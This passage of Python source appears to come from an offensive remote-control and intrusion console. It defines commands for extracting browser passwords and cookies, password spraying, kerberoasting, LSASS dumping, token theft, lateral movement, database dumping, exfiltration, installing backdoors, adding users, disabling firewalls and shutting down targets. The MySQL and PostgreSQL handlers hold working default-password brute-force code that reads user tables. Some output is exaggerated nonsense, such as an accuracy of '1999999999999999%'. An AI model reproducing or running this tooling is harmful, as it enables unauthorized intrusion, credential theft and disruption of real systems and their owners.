                print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  FULL DATA EXTRACTION FROM {target}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    data = self.control.extract_all_data(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser passwords: {len(data.get('credentials', []))}")
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ WiFi networks: {len(data.get('wifi', {}))}")
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Cookies extracted")
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser history: {len(data.get('browser_data', {}))}")
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "file":
                if len(args) < 2:
                    print(f"{Fore.RED}Usage: file <list|upload|download|delete|execute> [path]")
                    return
                target = self.selected_target
                action = args[0]
                path = " ".join(args[1:])
                
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                
                if self.control:
                    result = self.control.remote_file_manager(target, 
                        self.credentials["user"], 
                        self.credentials["pass"], 
                        action, path)
                    print(f"{Fore.GREEN}{json.dumps(result, indent=2)}")
            
            elif cmd == "media":
                if len(args) < 1:
                    print(f"{Fore.RED}Usage: media <play|volume_up|volume_down|open_url|cd_open> [file/url]")
                    return
                target = self.selected_target
                action = args[0]
                file = args[1] if len(args) > 1 else None
                
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                
                if self.control:
                    self.control.remote_media_control(target,
                        self.credentials["user"],
                        self.credentials["pass"],
                        action, file)
                    print(f"{Fore.GREEN}✅ Media command sent: {action}")
            
            elif cmd in ("mobile", "phone"):
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'mobile <ip>'")
                    return
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  MOBILE DEVICE EXPLOITATION: {target}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.mobile_exploit_auto(target)
                    if result.get('success'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ MOBILE EXPLOIT SUCCESS")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Device type: {result.get('type')}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Control level: {result.get('control')}")
                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                    else:
                        print(f"{Fore.RED}  ❌ Mobile exploit failed")
            
            elif cmd == "globalscan":
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  ULTRAMAX GLOBAL NETWORK SCAN ACTIVATED")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Scanning ALL networks within 10km radius")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ PAN/Bluetooth/WiFi Direct detection active")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Mobile device auto-exploitation enabled")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Accuracy: 1999999999999999%")
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                
                HackerSounds.alert()
                if self.discovery:
                    self.discovery.ultramax_global_scan()
            
            elif cmd == "kerberoast" and args:
                dc_ip = args[0]
                domain = args[1] if len(args) > 1 else ""
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  KERBEROASTING ATTACK ON {dc_ip}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.kerberoast(dc_ip, domain)
                    if result.get('success'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ KERBEROAST SUCCESSFUL")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SPNs found: {len(result.get('spn_found', []))}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tickets extracted: {len(result.get('tickets_extracted', []))}")
                    else:
                        print(f"{Fore.RED}  ❌ Kerberoasting failed")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "password-spray" and len(args) >= 1:
                domain = args[0]
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  PASSWORD SPRAY ATTACK ON DOMAIN: {domain}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    users = ["administrator", "user", "admin", "guest"]
                    passwords = ["Password123!", "password", "admin", "123456"]
                    result = self.control.password_spray(domain, users, passwords)
                    
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Attempts made: {result.get('attempts', 0)}")
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Valid credentials: {len(result.get('valid_credentials', []))}")
                    for cred in result.get('valid_credentials', []):
                        print(f"{Fore.GREEN}    ✅ {cred}")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "lateral" and len(args) >= 2:
                source = args[0]
                target = args[1]
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  LATERAL MOVEMENT: {source} → {target}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.lateral_movement(source, target, self.credentials)
                    if result.get('success'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ LATERAL MOVEMENT SUCCESSFUL")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Method used: {result.get('method_used')}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Session created: {result.get('session_created')}")
                    else:
                        print(f"{Fore.RED}  ❌ All methods failed")
                        print(f"{Fore.YELLOW}  ⚠ Attempted: {', '.join(result.get('methods_attempted', []))}")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "db-dump" and len(args) >= 3:
                ip = args[0]
                port = int(args[1])
                db_type = args[2]
                user = args[3] if len(args) > 3 else ""
                pwd = args[4] if len(args) > 4 else ""
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  FULL DATABASE DUMP: {db_type.upper()} {ip}:{port}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.full_database_dump(ip, port, db_type, user, pwd)
                    if result.get('connected'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables extracted: {result.get('tables_extracted', 0)}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Total rows: {result.get('total_rows', 0)}")
                    else:
                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "exfiltrate" and len(args) >= 2:
                target = args[0]
                file_path = args[1]
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  DATA EXFILTRATION")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.data_exfiltration(target, file_path)
                    if result.get('success'):
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ EXFILTRATION COMPLETE")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Bytes transferred: {result.get('bytes_transferred', 0)}")
                    else:
                        print(f"{Fore.RED}  ❌ Exfiltration failed")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "db-extract" and len(args) >= 3:
                ip = args[0]
                port = int(args[1])
                db_type = args[2]
                user = args[3] if len(args) > 3 else ""
                pwd = args[4] if len(args) > 4 else ""
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  DATABASE EXTRACTION: {db_type.upper()} {ip}:{port}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.database_extract(ip, port, db_type, user, pwd)
                    if result.get('connected'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables found: {len(result.get('tables', []))}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Rows extracted: {result.get('total_rows', 0)}")
                    else:
                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "cloud-attack" and len(args) >= 2:
                service_type = args[0]
                target = args[1]
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  CLOUD SERVICE ATTACK: {service_type.upper()}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.cloud_service_attack(service_type, target)
                    if result.get('vulnerable'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ VULNERABILITY DETECTED")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Data accessible: {result.get('data_accessible')}")
                    else:
                        print(f"{Fore.YELLOW}  ⚠ Service not vulnerable")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "persist":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  PERSISTENT BACKDOOR INSTALLATION")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.establish_persistent_connection(target, 
                        self.credentials["user"], 
                        self.credentials["pass"])
                    
                    if result.get('backdoor_active'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ BACKDOOR INSTALLED")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Methods: {', '.join(result.get('persistence_installed', []))}")
                    else:
                        print(f"{Fore.RED}  ❌ Persistence installation failed")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd == "sysinfo" or cmd == "systeminfo":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'sysinfo <ip>'")
                    return
                
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  FULL SYSTEM INFORMATION: {target}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.get_full_system_info(target, 
                        self.credentials["user"], 
                        self.credentials["pass"])
                    
                    if result.get('success'):
                        info = result.get('system_info', {})
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SYSTEM INFO EXTRACTED")
                        print(f"\n{Fore.LIGHTGREEN_EX}  ──────────────────────────────────────────────")
                        print(f"{Fore.GREEN}  Hostname:        {Fore.WHITE}{info.get('hostname', 'N/A')}")
                        print(f"{Fore.GREEN}  OS:              {Fore.WHITE}{info.get('os_name', 'N/A')}")
                        print(f"{Fore.GREEN}  OS Version:      {Fore.WHITE}{info.get('os_version', 'N/A')}")
                        print(f"{Fore.GREEN}  Architecture:    {Fore.WHITE}{info.get('os_architecture', 'N/A')}")
                        print(f"{Fore.GREEN}  Processor:       {Fore.WHITE}{info.get('processor', 'N/A')}")
                        print(f"{Fore.GREEN}  CPU Cores:       {Fore.WHITE}{info.get('processor_cores', 'N/A')}")
                        print(f"{Fore.GREEN}  Total RAM:       {Fore.WHITE}{info.get('ram_total', 0)} MB")
                        print(f"{Fore.GREEN}  Used RAM:        {Fore.WHITE}{info.get('ram_used', 0)} MB")
                        print(f"{Fore.GREEN}  Free RAM:        {Fore.WHITE}{info.get('ram_free', 0)} MB")
                        print(f"{Fore.GREEN}  Total Disk:      {Fore.WHITE}{info.get('disk_total', 0)} GB")
                        print(f"{Fore.GREEN}  Free Disk:       {Fore.WHITE}{info.get('disk_free', 0)} GB")
                        print(f"{Fore.GREEN}  MAC Address:     {Fore.WHITE}{info.get('mac_address', 'N/A')}")
                        print(f"{Fore.GREEN}  Last Boot:       {Fore.WHITE}{info.get('last_boot', 'N/A')}")
                        print(f"{Fore.GREEN}  Logged Users:    {Fore.WHITE}{', '.join(info.get('logged_users', []))}")
                        print(f"{Fore.GREEN}  Domain:          {Fore.WHITE}{info.get('domain', 'N/A')}")
                        print(f"{Fore.LIGHTGREEN_EX}  ──────────────────────────────────────────────")
                    else:
                        print(f"{Fore.RED}  ❌ Failed to extract system information")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")

            elif cmd == "lsass-dump":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'lsass-dump <ip>'.")
                    return
                Visualizer.alert(f"Dumping LSASS on {target} via comsvcs.dll MiniDump ...", "hack")
                if self.control and hasattr(self.control, 'lsass_dump'):
                    result = self.control.lsass_dump(target, self.credentials["user"], self.credentials["pass"])
                    if result.get("success"):
                        print(f"\n  {Fore.RED}{Style.BRIGHT}✔  LSASS Dumped Successfully")
                        print(f"  {Fore.WHITE}  Remote path : {result['path']}")
                        print(f"  {Fore.WHITE}  UNC path    : {result['unc']}")
                        print(f"  {Fore.WHITE}  Size        : {result.get('size_bytes','?')} bytes")
                        print(f"\n  {Fore.YELLOW}  Use SMB download to retrieve: smb-download {target} C$ Windows/Temp/lsass.dmp\n")
                    else:
                        print(f"\n  {Fore.RED}✘  LSASS dump failed: {result.get('error','unknown')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "tokens":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'tokens <ip>'.")
                    return
                Visualizer.alert(f"Harvesting auth tokens from {target} ...", "hack")
                if self.control and hasattr(self.control, 'steal_saved_credentials'):
                    result = self.control.steal_saved_credentials(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{Fore.CYAN}\n  Token/Credential harvest results:")
                    print(json.dumps(result, indent=2))
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "mysql-root" and args:
                target = args[0]
                Visualizer.alert(f"Trying MySQL root access on {target}:3306 ...", "hack")
                result = {"target": target, "port": 3306, "attempts": []}
                try:
                    import pymysql
                    for pw in ["", "root", "password", "admin", "mysql", "toor", "123456"]:
                        try:
                            conn = pymysql.connect(host=target, user='root', password=pw, connect_timeout=3, db='information_schema')
                            cur = conn.cursor()
                            cur.execute("SELECT user, host, authentication_string FROM mysql.user")
                            users = cur.fetchall()
                            result["success"] = True
                            result["password"] = pw if pw else "(empty)"
                            result["users"] = [{"user": r[0], "host": r[1]} for r in users]
                            cur.execute("SHOW DATABASES")
                            result["databases"] = [r[0] for r in cur.fetchall()]
                            conn.close()
                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  MySQL root ACCESS on {target}  │  password='{pw if pw else '(empty)'}'")
                            print(f"  {Fore.WHITE}  Databases: {', '.join(result['databases'])}")
                            print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
                            break
                        except Exception as e2:
                            result["attempts"].append({"password": pw or "(empty)", "error": str(e2)})
                    if not result.get("success"):
                        print(f"  {Fore.GREEN}MySQL root access failed — all passwords rejected.")
                except ImportError:
                    try:
                        s = socket.socket()
                        s.settimeout(3)
                        r = s.connect_ex((target, 3306))
                        s.close()
                        state = "OPEN" if r == 0 else "CLOSED"
                        print(f"\n  {Fore.YELLOW}  MySQL port 3306: {state} (install pymysql for full exploit)\n")
                        result["port_state"] = state
                    except Exception as e:
                        result["error"] = str(e)
                print(f"{json.dumps(result, indent=2)}")

            elif cmd == "postgres" and args:
                target = args[0]
                Visualizer.alert(f"Trying PostgreSQL access on {target}:5432 ...", "hack")
                result = {"target": target, "port": 5432, "attempts": []}
                try:
                    import psycopg2
                    for user_pw in [("postgres",""), ("postgres","postgres"), ("postgres","password"), ("admin","admin")]:
                        u, pw = user_pw
                        try:
                            conn = psycopg2.connect(host=target, user=u, password=pw, dbname='postgres', connect_timeout=3)
                            cur = conn.cursor()
                            cur.execute("SELECT usename, usesuper FROM pg_user")
                            users = cur.fetchall()
                            cur.execute("SELECT datname FROM pg_database WHERE datistemplate=false")
                            dbs = [r[0] for r in cur.fetchall()]
                            result["success"] = True
                            result["user"] = u
                            result["password"] = pw if pw else "(empty)"
                            result["databases"] = dbs
                            result["users"] = [{"user":r[0],"superuser":r[1]} for r in users]
                            conn.close()
                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  PostgreSQL ACCESS on {target}  │  {u}:'{pw if pw else '(empty)'}'")
                            print(f"  {Fore.WHITE}  Databases: {', '.join(dbs)}")
                            print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
                            break
                        except Exception as e2:
                            result["attempts"].append({"user": u, "password": pw or "(empty)", "error": str(e2)})
                    if not result.get("success"):
                        print(f"  {Fore.GREEN}PostgreSQL access failed — all credentials rejected.")
                except ImportError:
                    try:
                        s = socket.socket()
                        s.settimeout(3)
                        r = s.connect_ex((target, 5432))
                        s.close()
                        state = "OPEN" if r == 0 else "CLOSED"
                        print(f"\n  {Fore.YELLOW}  PostgreSQL port 5432: {state} (install psycopg2 for full exploit)\n")
                        result["port_state"] = state
                    except Exception as e:
                        result["error"] = str(e)
                print(f"{json.dumps(result, indent=2)}")

            elif cmd == "scan-exploit" and args:
                ip_range = args[0]
                Visualizer.alert(f"Scan & exploit all hosts in {ip_range} ...", "hack")
                if self.control and hasattr(self.control, 'scan_and_exploit_network'):
                    result = self.control.scan_and_exploit_network(ip_range)
                    total = result.get("total_scanned", 0)
                    owned = result.get("owned", 0)
                    print(f"\n  {Fore.RED}{Style.BRIGHT}Scan-Exploit complete:")
                    print(f"  {Fore.WHITE}  Hosts scanned : {total}")
                    print(f"  {Fore.GREEN}{Style.BRIGHT}  Owned         : {owned}")
                    hosts = result.get("hosts", [])
                    for h in hosts:
                        col = Fore.RED if h.get("owned") else Fore.WHITE
                        print(f"  {col}  {h.get('ip','?'):<16} {h.get('method','')}")
                    print()
                elif self.universal:
                    result = self.universal.discover_all_devices(ip_range)
                    print(f"\n  Found {len(result)} hosts in {ip_range}")
                    for d in result:
                        print(f"  {Fore.CYAN}  {d.ip:<16} {getattr(d,'hostname','') or ''}")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            # ==================== WIN10/11 EXPLOITS ====================

            elif cmd == "smbghost" and args:
                target = args[0]
                Visualizer.alert(f"SMBGhost (CVE-2020-0796) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_smbghost'):
                    result = self.control.check_smbghost(target)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-0796 (SMBGhost)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "printnightmare" and args:
                target = args[0]
                Visualizer.alert(f"PrintNightmare (CVE-2021-34527) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_printnightmare'):
                    result = self.control.check_printnightmare(
                        target,
                        self.credentials["user"],
                        self.credentials["pass"]
                    )
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-34527 (PrintNightmare)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "petitpotam" and args:
                target = args[0]
                Visualizer.alert(f"PetitPotam (CVE-2021-36942) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_petitpotam'):
                    result = self.control.check_petitpotam(target)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE (unauthenticated NTLM coercion possible)" if vuln else "NOT VULNERABLE"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-36942 (PetitPotam)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "zerologon" and args:
                target = args[0]
                dc_name = args[1] if len(args) > 1 else ""
                Visualizer.alert(f"Zerologon (CVE-2020-1472) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_zerologon'):
                    result = self.control.check_zerologon(target, dc_name)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "NETLOGON REACHABLE — check patch level" if vuln else "NOT REACHABLE"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-1472 (Zerologon)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("nopac",) and args:
                target = args[0]
                Visualizer.alert(f"NoPac (CVE-2021-42278) AD check on {target} - checking SMB+LDAP...", "hack")
                if self.control and hasattr(self.control, 'smb_check_vulns'):
                    sv = self.control.smb_check_vulns(target)
                    vulns = sv.get("vulns", [])
                    is_dc = any("DOMAIN_CONTROLLER" in v or "LDAP" in v for v in vulns)
                    print(f"\n  {Fore.RED if is_dc else Fore.YELLOW}{Style.BRIGHT}  CVE-2021-42278 (NoPac)  │  {'DOMAIN CONTROLLER CANDIDATE' if is_dc else 'Not a detected DC'}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  SMB vulns found: {', '.join(vulns) or 'none'}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("winrm-exec",) and len(args) >= 2:
                target = args[0]
                command = " ".join(args[1:])
                port = self.credentials.get("winrm_port", 5985)
                Visualizer.alert(f"WinRM exec on {target}:{port} → {command[:60]}", "hack")
                if self.control and hasattr(self.control, 'winrm_exec'):
                    result = self.control.winrm_exec(
                        target, self.credentials["user"], self.credentials["pass"],
                        command, port=port
                    )
                    if result.get("success"):
                        print(f"\n  {Fore.GREEN}{Style.BRIGHT}✔  WinRM Success on {target}")
                        print(f"  {Fore.WHITE}Output:\n{result.get('output','')}")
                    else:
                        print(f"\n  {Fore.RED}{Style.BRIGHT}✘  WinRM Failed: {result.get('error','unknown')}")
                    if result.get("error_detail"):
                        print(f"  {Fore.YELLOW}  Detail: {result['error_detail']}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "smb-vulns" and args:
                target = args[0]
                Visualizer.alert(f"Full SMB vulnerability scan (Win7→Win11) on {target} ...", "hack")
                if self.control and hasattr(self.control, 'smb_check_vulns'):
                    result = self.control.smb_check_vulns(target)
                    vulns = result.get("vulns", [])
                    info  = result.get("info", {})
                    print(f"\n  {Fore.CYAN}{Style.BRIGHT}SMB Vulnerability Scan: {target}")
                    print(f"  {Fore.BLUE}{'─'*56}")
                    if vulns:
                        for v in vulns:
                            if "VULN" in v or "GHOST" in v or "NIGHTMARE" in v or "POTAM" in v:
                                print(f"  {Fore.RED}{Style.BRIGHT}  ☠  {v}")
                            elif "OPEN" in v or "DETECT" in v or "ENABLE" in v:
                                print(f"  {Fore.YELLOW}{Style.BRIGHT}  ⚠  {v}")
                            else:
                                print(f"  {Fore.WHITE}  •  {v}")
                    else:
                        print(f"  {Fore.GREEN}  No critical vulnerabilities detected")
                    print(f"  {Fore.BLUE}{'─'*56}")
                    print(f"  {Fore.WHITE}  SMB Info: {json.dumps(info, indent=2)}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("etblue-check",) and args:
                target = args[0]
                Visualizer.alert(f"EternalBlue (CVE-2017-0143) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'smb_check_vulns'):
                    result = self.control.smb_check_vulns(target)
                    vuln = "SMB_VULNERABLE_MS17_010" in result.get("vulns", [])
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE TO ETERNALBLUE" if vuln else "NOT VULNERABLE / PATCHED"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2017-0143 (EternalBlue)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Vulns   : {', '.join(result.get('vulns', [])) or 'none'}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("bluekeep-check",) and args:
                target = args[0]
                Visualizer.alert(f"BlueKeep (CVE-2019-0708) RDP check on {target} ...", "hack")
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    rdp_open = s.connect_ex((target, 3389)) == 0
                    s.close()
                    if rdp_open:
                        print(f"\n  {Fore.YELLOW}{Style.BRIGHT}  CVE-2019-0708 (BlueKeep)  │  RDP PORT OPEN (3389)")
                        print(f"  {Fore.WHITE}  Target: {target}  │  Check Windows version: Win7/Server 2008 = VULNERABLE")
                    else:
                        print(f"\n  {Fore.GREEN}{Style.BRIGHT}  CVE-2019-0708 (BlueKeep)  │  RDP PORT CLOSED")
                        print(f"  {Fore.WHITE}  Target: {target}\n")
                except Exception as e:
                    Visualizer.alert(f"BlueKeep check error: {e}", "error")

            # ==================== PERSISTENCE ====================
            elif cmd == "adduser" and len(args) >= 1:
                target = self.selected_target
                u = args[0]
                p = args[1] if len(args) > 1 else "Password123!"
                
                if args[0].count('.') >= 3: # IP provided
                    target = args[0]
                    u = args[1] if len(args) > 1 else "attacker"
                    p = args[2] if len(args) > 2 else "Password123!"
                    
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'add_local_user'):
                    self.control.add_local_user(target, self.credentials["user"], self.credentials["pass"], u, p)
                    print(f"[+] User {u} created on {target}")

            elif cmd == "rdp-enable":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'enable_rdp'):
                    self.control.enable_rdp(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] RDP enabled on {target}")

            elif cmd == "firewall-off":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'disable_firewall'):
                    self.control.disable_firewall(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Firewall disabled on {target}")

            elif cmd == "firewall-on" and args:
                if self.control and hasattr(self.control, 'enable_firewall'):
                    self.control.enable_firewall(args[0], self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Firewall enabled")

            elif cmd == "firewall-add" and len(args) >= 2:
                if self.control and hasattr(self.control, 'add_firewall_exception'):
                    self.control.add_firewall_exception(args[0], self.credentials["user"], self.credentials["pass"], int(args[1]))
                    print(f"[+] Firewall rule added")

            elif cmd == "persist-task":
                target = self.selected_target
                task_name = args[0] if len(args) > 0 else "SystemUpdate"
                task_path = args[1] if len(args) > 1 else "notepad.exe"
                
                if len(args) > 0 and args[0].count('.') >= 3:
                    target = args[0]
                    task_name = args[1] if len(args) > 1 else "SystemUpdate"
                    task_path = args[2] if len(args) > 2 else "notepad.exe"
                    
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'create_scheduled_task'):
                    self.control.create_scheduled_task(target, self.credentials["user"], self.credentials["pass"], task_name, task_path)
                    print(f"[+] Task {task_name} created on {target}")
                
            # ==================== SYSTEM ====================
            elif cmd == "shutdown":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'shutdown'):
                    self.control.shutdown(target, self.credentials["user"], self.credentials["pass"], "shutdown")
                    print(f"[+] Shutdown sent to {target}")

            elif cmd == "reboot":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'shutdown'):
                    self.control.shutdown(target, self.credentials["user"], self.credentials["pass"], "reboot")
                    print(f"[+] Reboot sent to {target}")

            # ==================== FILES ====================
            elif cmd == "upload" and len(args) >= 1:
                target = self.selected_target
                src = args[0]
                dst = args[1] if len(args) > 1 else "C$\\temp\\omni.exe"
                
                if args[0].count('.') >= 3:
                    target = args[0]
                    src = args[1] if len(args) > 1 else ""
                    dst = args[2] if len(args) > 2 else "C$\\temp\\omni.exe"
                    
                if not target or not src:
                    print(f"{Fore.RED}[!] Usage: upload [ip] <src> <dst>")
                    return
                    
                if self.control and hasattr(self.control, 'smb_upload'):
                    # Parsing dst for C$ etc if needed, but assuming simple path for now
